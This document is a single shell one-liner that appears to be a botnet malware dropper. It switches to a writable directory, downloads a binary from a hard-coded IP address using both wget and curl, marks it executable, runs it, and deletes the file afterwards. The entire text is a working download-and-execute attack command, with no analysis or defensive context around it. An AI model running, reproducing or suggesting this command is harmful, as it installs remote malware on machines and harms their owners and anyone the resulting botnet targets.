cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.213.33/wget; curl -O http://163.172.213.33/wget; chmod +x wget; ./wget; rm -rf wget
